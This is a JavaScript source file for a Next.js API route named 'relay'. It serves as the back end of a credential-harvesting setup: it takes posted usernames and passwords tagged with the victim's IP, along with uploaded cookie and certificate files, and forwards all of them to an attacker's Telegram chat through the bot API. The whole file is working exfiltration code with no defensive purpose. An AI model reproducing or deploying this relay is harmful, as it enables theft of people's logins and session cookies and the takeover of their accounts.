// pages/api/relay.js
import { Blob } from "buffer";
import multer from "multer";
import nextConnect from "next-connect";

const upload = multer();

const handler = nextConnect({
  onError(err, req, res) {
    console.error("🚨 Handler Error:", err);
    res.status(500).json({ success: false, message: err.message });
  },
  onNoMatch(req, res) {
    res.status(405).json({ success: false, message: `Method ${req.method} Not Allowed` });
  },
});

export const config = { api: { bodyParser: false } };

handler.use(upload.single("file"));

handler.use((req, res, next) => {
  // parse JSON if needed
  if (req.headers["content-type"]?.startsWith("application/json")) {
    let buf = "";
    req.on("data", c => buf += c);
    req.on("end", () => {
      try { req.body = JSON.parse(buf) } catch(e){ console.error(e) }
      next();
    });
  } else {
    next();
  }
});

handler.post(async (req, res) => {
  const { ip, type } = req.body;
  console.log(`🚀 Handling ${type} from ${ip}`);

  const token  = process.env.TELEGRAM_TOKEN;
  const chatId = process.env.TELEGRAM_CHAT_ID;
  if (!token || !chatId) {
    return res.status(500).json({ success: false, message: "Missing Telegram env vars" });
  }
  const botUrl = `https://api.telegram.org/bot${token}`;

  try {
    let tgRes;
    if (type === "creds") {
      const { user, pass } = req.body;
      const text = `🔑 Creds from ${ip}:\nUser: ${user}\nPass: ${pass}`;
      tgRes = await fetch(`${botUrl}/sendMessage`, {
        method: "POST",
        headers: { "Content-Type":"application/json" },
        body: JSON.stringify({ chat_id: chatId, text })
      });
    }
    else if ((type === "cookie-file" || type === "cert-file") && req.file) {
      console.log("📂 Got file:", req.file.originalname, req.file.size, "bytes");

      // Convert Buffer → Blob
      const blob = new Blob([req.file.buffer], { type: "text/plain" });

      // Build FormData for sendDocument
      const form = new FormData();
      form.append("chat_id", chatId);
      form.append("document", blob, req.file.originalname);

      tgRes = await fetch(`${botUrl}/sendDocument`, {
        method: "POST",
        body: form
      });
    }
    else {
      return res.status(400).json({ success: false, message: "Bad payload" });
    }

    if (!tgRes.ok) {
      const errText = await tgRes.text();
      console.error("❌ Telegram API error:", errText);
      return res.status(502).json({ success: false, message: errText });
    }

    res.status(200).json({ success: true });
  } catch (err) {
    console.error("❌ Relay handler error:", err);
    res.status(500).json({ success: false, message: err.message });
  }
});

export default handler;
